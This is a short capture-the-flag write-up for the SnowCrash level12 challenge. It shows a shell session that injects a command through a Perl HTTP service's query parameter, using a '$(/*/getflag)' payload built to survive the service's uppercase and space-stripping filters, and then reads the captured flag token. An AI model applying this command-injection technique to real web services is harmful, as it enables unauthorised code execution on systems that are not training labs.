In the home directory you will found a perl script, assuming that this script is runing in the background, we will have an http server with a system call that we can exploit, the only problem is that the parameter given to this system call, is previously modified, making all characters uppercase, and triming all the spaces, so one work around can be this:

``` shell
level12@SnowCrash:~$ echo "getflag > /tmp/flag" > /tmp/GETFLAG;
level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
level12@SnowCrash:~$ curl http://localhost:4646/?x='$(/*/getflag)'&y=''
[1] 2513
level12@SnowCrash:~$ ..
[1]+  Done                    curl http://localhost:4646/?x='$(/*/getflag)'
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$ 
```
